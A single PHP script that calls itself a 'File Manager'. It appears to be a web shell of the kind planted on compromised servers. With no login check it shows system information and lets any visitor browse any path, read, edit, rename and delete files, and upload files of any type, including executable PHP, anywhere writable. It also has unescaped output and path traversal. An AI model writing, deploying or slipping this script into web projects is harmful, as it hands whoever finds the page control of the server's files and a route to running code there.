<?php
// Function to get file permissions in symbolic format
function getFilePermissions($filePath) {
    $perms = fileperms($filePath);

    // Convert permissions to symbolic format
    $symbolic = '';
    $symbolic .= (($perms & 0x0100) ? 'r' : '-');
    $symbolic .= (($perms & 0x0080) ? 'w' : '-');
    $symbolic .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $symbolic .= (($perms & 0x0020) ? 'r' : '-');
    $symbolic .= (($perms & 0x0010) ? 'w' : '-');
    $symbolic .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $symbolic .= (($perms & 0x0004) ? 'r' : '-');
    $symbolic .= (($perms & 0x0002) ? 'w' : '-');
    $symbolic .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    // Get numeric permissions
    $numeric = substr(sprintf('%o', $perms), -4);

    return [
        'symbolic' => $symbolic,
        'numeric' => $numeric
    ];
}

// Function to recursively list directories and files
function listDirectory($dir) {
    // Get the current directory contents
    $files = scandir($dir);
    $system_info = php_uname();
    // Display current directory name
    echo "<h4 class='mb-4 text-light'>$system_info</h4>";
    echo "<h5 class='mb-4 text-light'>Directory: <span class='text-info'>$dir</span></h5>";

    // Display link to go back to the parent directory
    $parentDir = dirname($dir);
    if ($dir !== '/') {
        echo "<a class='btn btn-secondary mb-3' href='?dir=" . urldecode($parentDir) . "'><i class='fas fa-arrow-left'></i> Go Back</a><br>";
    }

    // Display option to create a new file
    echo "<div class='row mb-3'>
            <div class='col-md-4'>
                <form method='post' class='mb-3'>
                    <div class='input-group'>
                        <input type='text' name='new_file_name' class='form-control bg-dark text-light' placeholder='New file name' required>
                        <button type='submit' name='create_file' class='btn btn-primary'><i class='fas fa-plus'></i> Create</button>
                    </div>
                </form>
            </div>
            <div class='col-md-4'>
                <form method='post' enctype='multipart/form-data'>
                    <div class='input-group'>
                        <input type='file' name='fileup[]' class='form-control bg-dark text-light' multiple required>
                        <button type='submit' name='upload_file' class='btn btn-success'><i class='fas fa-upload'></i> Upload</button>
                    </div>
                </form>
            </div>
          </div>";

    // Display list of directories first, then files
    echo "<ul class='list-group'>";
    // First, list directories
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $fullPath = "$dir/$file";
            if (is_dir($fullPath)) {
                $perms = getFilePermissions($fullPath);
                echo "<li class='list-group-item d-flex justify-content-between align-items-center bg-dark text-light'>
                        <span><i class='fas fa-folder text-warning'></i> <a href='?dir=" . urldecode($fullPath) . "' class='text-decoration-none text-light'>$file</a></span>
                        <span class='badge bg-secondary'>{$perms['symbolic']} / {$perms['numeric']}</span>
                      </li>";
            }
        }
    }
    // Then, list files
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $fullPath = "$dir/$file";
            if (!is_dir($fullPath)) {
                $perms = getFilePermissions($fullPath);
                echo "<li class='list-group-item d-flex justify-content-between align-items-center bg-dark text-light'>
                        <span><i class='fas fa-file text-info'></i> $file</span>
                        <div>
                            <span class='badge bg-secondary me-2'>{$perms['symbolic']} / {$perms['numeric']}</span>
                            <a href='?view=" . urldecode($fullPath) . "' class='btn btn-sm btn-info'><i class='fas fa-eye'></i></a>
                            <a href='?edit=" . urldecode($fullPath) . "' class='btn btn-sm btn-warning'><i class='fas fa-edit'></i></a>
                            <a href='?rename=" . urldecode($fullPath) . "' class='btn btn-sm btn-secondary'><i class='fas fa-pen'></i></a>
                            <a href='#' onclick='confirmDelete(\"$fullPath\")' class='btn btn-sm btn-danger'><i class='fas fa-trash'></i></a>
                        </div>
                      </li>";
            }
        }
    }
    echo "</ul>";
}

// Function to create a new file
function createFile($dir, $fileName) {
    $filePath = "$dir/$fileName";
    if (!file_exists($filePath)) {
        file_put_contents($filePath, ""); // Create an empty file
        echo "<div class='alert alert-success mt-3'>File '$fileName' created successfully!</div>";
    } else {
        echo "<div class='alert alert-danger mt-3'>File '$fileName' already exists.</div>";
    }
}

// Function to upload multiple files
function uploadFile($dir) {
    $uploadpath = $dir . '/';      // Directory to store the uploaded files
    $max_size = 2000;              // Maximum file size, in KiloBytes
    $alwidth = 900;                // Maximum allowed width, in pixels
    $alheight = 800;               // Maximum allowed height, in pixels

    if (isset($_FILES['fileup'])) {
        $files = $_FILES['fileup'];
        $uploadedFiles = 0;

        // Loop through each file
        foreach ($files['name'] as $key => $name) {
            if (strlen($name) > 1) {
                $fileTmp = $files['tmp_name'][$key];
                $fileSize = $files['size'][$key];
                $fileError = $files['error'][$key];
                $fileType = strtolower(pathinfo($name, PATHINFO_EXTENSION));

                // Check if the file is an image and get its dimensions
                if (in_array($fileType, ['jpg', 'jpe', 'png', 'gif'])) {
                    list($width, $height) = getimagesize($fileTmp);
                }

                // Validate file size, width, and height
                $err = '';
                if ($fileSize > $max_size * 1000) $err .= 'File ' . $name . ' exceeds maximum size of ' . $max_size . ' KB.<br>';
                if (isset($width) && isset($height) && ($width >= $alwidth || $height >= $alheight)) $err .= 'File ' . $name . ' exceeds maximum dimensions of ' . $alwidth . 'x' . $alheight . '.<br>';

                // If no errors, upload the file
                if ($err == '') {
                    $destination = $uploadpath . basename($name);
                    if (move_uploaded_file($fileTmp, $destination)) {
                        $uploadedFiles++;
                    } else {
                        echo '<div class="alert alert-danger mt-3">Failed to upload ' . $name . '.</div>';
                    }
                } else {
                    echo '<div class="alert alert-danger mt-3">' . $err . '</div>';
                }
            }
        }

        if ($uploadedFiles > 0) {
            echo '<div class="alert alert-success mt-3">' . $uploadedFiles . ' file(s) uploaded successfully!</div>';
        }
    } else {
        echo '<div class="alert alert-danger mt-3">No files selected.</div>';
    }
}

// Function to view file content
function viewFile($filePath) {
    if (file_exists($filePath) && is_file($filePath)) {
        $content = htmlspecialchars(file_get_contents($filePath));
        echo "<h2 class='mb-4 text-light'>Viewing File: <span class='text-info'>$filePath</span></h2>";
        echo "<pre class='bg-dark text-light p-3 rounded'><code>$content</code></pre>";
        echo "<a class='btn btn-secondary' href='?dir=" . urldecode(dirname($filePath)) . "'><i class='fas fa-arrow-left'></i> Back to Directory</a>";
    } else {
        echo "<div class='alert alert-danger mt-3'>File not found.</div>";
    }
}

// Function to edit file content
function editFile($filePath) {
    if (isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<div class='alert alert-success mt-3'>File saved successfully!</div>";
    }

    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<h2 class='mb-4 text-light'>Editing File: <span class='text-info'>$filePath</span></h2>";
    echo "<form method='post'>
            <textarea name='content' class='form-control bg-dark text-light mb-3' rows='15'>$content</textarea>
            <button type='submit' class='btn btn-primary'><i class='fas fa-save'></i> Save Changes</button>
          </form>";
    echo "<a class='btn btn-secondary mt-3' href='?dir=" . urldecode(dirname($filePath)) . "'><i class='fas fa-arrow-left'></i> Back to Directory</a>";
}

// Function to delete a file
function deleteFile($filePath) {
    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            echo "<script>alert('File deleted successfully!'); window.location.href = '?dir=" . urlencode(dirname($filePath)) . "';</script>";
        } else {
            echo "<script>alert('Failed to delete file.'); window.location.href = '?dir=" . urlencode(dirname($filePath)) . "';</script>";
        }
    } else {
        echo "<script>alert('File not found.'); window.location.href = '?dir=" . urlencode(dirname($filePath)) . "';</script>";
    }
}

// Function to rename a file
function renameFile($filePath, $newName) {
    $dir = dirname($filePath);
    $newFilePath = "$dir/$newName";

    // Check if the new file name already exists
    if (file_exists($newFilePath)) {
        echo "<div class='alert alert-danger mt-3'>A file with the name '$newName' already exists.</div>";
        return;
    }

    // Attempt to rename the file
    if (rename($filePath, $newFilePath)) {
        echo "<div class='alert alert-success mt-3'>File renamed successfully to '$newName'.</div>";
    } else {
        echo "<div class='alert alert-danger mt-3'>Failed to rename file. Please check permissions.</div>";
    }
}

// Determine what action to take
if (isset($_POST['upload_file'])) {
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    uploadFile($currentDir);
    listDirectory($currentDir);
} elseif (isset($_GET['view'])) {
    $filePath = realpath($_GET['view']);
    viewFile($filePath);
} elseif (isset($_GET['edit'])) {
    $filePath = realpath($_GET['edit']);
    editFile($filePath);
} elseif (isset($_GET['delete'])) {
    $filePath = realpath($_GET['delete']);
    deleteFile($filePath);
} elseif (isset($_GET['rename'])) {
    $filePath = realpath($_GET['rename']);
    echo "<h2 class='mb-4 text-light'>Rename File: <span class='text-info'>" . basename($filePath) . "</span></h2>";
    echo "<form method='post' action='?dir=" . urldecode(dirname($filePath)) . "'>
            <div class='input-group mb-3'>
                <input type='text' name='new_name' class='form-control bg-dark text-light' value='" . basename($filePath) . "' required>
                <input type='hidden' name='file_path' value='$filePath'>
                <button type='submit' name='rename_file' class='btn btn-primary'><i class='fas fa-save'></i> Rename</button>
            </div>
          </form>";
} elseif (isset($_POST['rename_file']) && !empty($_POST['new_name'])) {
    $filePath = $_POST['file_path'];
    $newName = $_POST['new_name'];
    renameFile($filePath, $newName);
    $currentDir = dirname($filePath);
    listDirectory($currentDir);
} elseif (isset($_POST['create_file']) && !empty($_POST['new_file_name'])) {
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    createFile($currentDir, $_POST['new_file_name']);
    listDirectory($currentDir);
} else {
    // Default action: list directory contents
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    listDirectory($currentDir);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <!-- Dark Mode -->
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
        }
        .list-group-item {
            background-color: #1e1e1e;
            border-color: #444;
        }
        .form-control {
            background-color: #333;
            color: #fff;
            border-color: #444;
        }
        .form-control:focus {
            background-color: #444;
            color: #fff;
            border-color: #666;
        }
        .text-light {
            color: #f8f9fa !important;
        }
    </style>
    <!-- JavaScript for Delete Confirmation -->
    <script>
        function confirmDelete(filePath) {
            if (confirm('Are you sure you want to delete this file?')) {
                window.location.href = '?delete=' + encodeURIComponent(filePath);
            }
        }
    </script>
</head>
<body class="p-4">
    <div class="container">
        <!-- Content is dynamically generated by PHP -->
    </div>
    <!-- Bootstrap 5 JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>